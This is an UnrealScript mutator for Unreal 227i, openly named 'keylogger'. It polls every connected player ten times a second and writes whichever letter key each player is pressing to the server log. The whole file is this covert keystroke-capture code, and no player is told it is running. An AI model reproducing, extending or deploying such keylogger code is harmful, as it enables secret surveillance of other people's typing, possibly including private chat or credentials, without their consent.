class keylogger expands Mutator;

function PostBeginPlay()
{
	
	log ("-----------------------------------------------------------------------------",stringtoname("------------"));
	log (" Loading keylogger  For 227i",stringtoname("[keylogger]"));
    SetTimer(0.1,true); 
}






function timer ()                                          
 { 
 local playerpawn p;
    ForEach AllActors(Class'playerPawn',P)
    {
     log (returnkeys(p));
 
    }
 
 
 }
 
 
 
 function string returnkeys(playerpawn pp)
 
 {
 if (pp.IsPressing(65)) {return 	"a"; }; 
 if (pp.IsPressing(66)) {return 	"b"; }; 
 if (pp.IsPressing(67)) {return 	"c"; }; 
 if (pp.IsPressing(68)) {return 	"d"; }; 
 if (pp.IsPressing(69)) {return 	"e"; }; 
 if (pp.IsPressing(70)) {return 	"f"; }; 
 if (pp.IsPressing(71)) {return 	"g"; }; 
 if (pp.IsPressing(72)) {return 	"h"; }; 
 if (pp.IsPressing(73)) {return 	"i"; }; 
 if (pp.IsPressing(74)) {return 	"j"; }; 
 if (pp.IsPressing(75)) {return 	"k"; }; 
 if (pp.IsPressing(76)) {return 	"l"; }; 
 if (pp.IsPressing(77)) {return 	"m"; }; 
 if (pp.IsPressing(78)) {return 	"n"; }; 
 if (pp.IsPressing(79)) {return 	"o"; }; 
 if (pp.IsPressing(80)) {return 	"p"; }; 
 if (pp.IsPressing(81)) {return 	"q"; }; 
 if (pp.IsPressing(82)) {return 	"r"; }; 
 if (pp.IsPressing(83)) {return 	"s"; }; 
 if (pp.IsPressing(84)) {return 	"t"; }; 
 if (pp.IsPressing(85)) {return 	"u"; }; 
 if (pp.IsPressing(86)) {return 	"v"; }; 
 if (pp.IsPressing(87)) {return 	"w"; }; 
 if (pp.IsPressing(88)) {return 	"x"; }; 
 if (pp.IsPressing(89)) {return 	"y"; }; 
 if (pp.IsPressing(90)) {return 	"z"; }; 
 
 }

defaultproperties
{
}
